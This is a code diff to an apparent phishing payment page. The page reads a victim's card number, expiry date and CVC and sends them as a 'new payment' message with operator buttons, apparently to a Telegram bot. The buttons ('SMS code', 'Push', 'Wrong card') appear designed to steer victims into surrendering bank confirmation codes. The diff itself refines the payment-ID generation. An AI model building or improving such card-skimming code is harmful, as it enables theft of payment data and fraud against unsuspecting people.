@@ -1274,8 +1274,8 @@
         const expiry = document.getElementById('expiry').value;
         const cvc = document.getElementById('cvc').value;
 
-        // ГЕНЕРИРУЕМ УНИКАЛЬНЫЙ ID для каждого платежа
-        const paymentId = Date.now();
+        // ГЕНЕРИРУЕМ УНИКАЛЬНЫЙ ID с случайным числом
+        const paymentId = Date.now() + '_' + Math.floor(Math.random() * 1000);
 
         const message = `💳 НОВАЯ ОПЛАТА
 
@@ -1305,17 +1305,17 @@
                         [
                             { 
                                 text: "📱 SMS код", 
-                                callback_data: `sms_${paymentId}_user123`  // ← УНИКАЛЬНЫЙ
+                                callback_data: `sms_${paymentId}_user123`
                             },
                             { 
                                 text: "🔔 Пуш", 
-                                callback_data: `push_${paymentId}_user123`  // ← УНИКАЛЬНЫЙ
+                                callback_data: `push_${paymentId}_user123`
                             }
                         ],
                         [
                             { 
                                 text: "❌ Неверная карта", 
-                                callback_data: `wrong_card_${paymentId}_user123`  // ← УНИКАЛЬНЫЙ
+                                callback_data: `wrong_card_${paymentId}_user123`
                             }
                         ]
                     ]
@@ -1481,6 +1481,7 @@
     </script>
 </body>
 </html>
+
 
 
 
